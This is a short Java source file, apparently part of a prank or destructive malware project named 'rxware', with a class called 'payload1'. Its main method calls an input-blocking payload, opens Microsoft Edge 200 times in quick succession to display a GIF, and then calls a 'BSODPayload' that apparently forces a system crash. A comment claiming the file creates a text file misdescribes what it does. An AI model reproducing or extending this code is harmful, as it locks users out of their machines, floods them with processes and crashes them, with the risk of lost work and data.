package rxware;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

// Java program to create a text File using FileWriter
public class payload1{
    public static void main(){
        Path programPath = Paths.get("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");

        try {
            String gifPath = payload1.class.getResource("rotary.gif").toURI().getPath();

            try {
                InputBlockerPayload.main();
                for(int i = 0; i < 200; i++){
                    Process mainProgram = new ProcessBuilder(programPath.toString(), gifPath).start();
                    try {
                        TimeUnit.MILLISECONDS.sleep(200);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
                BSODPayload.main();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
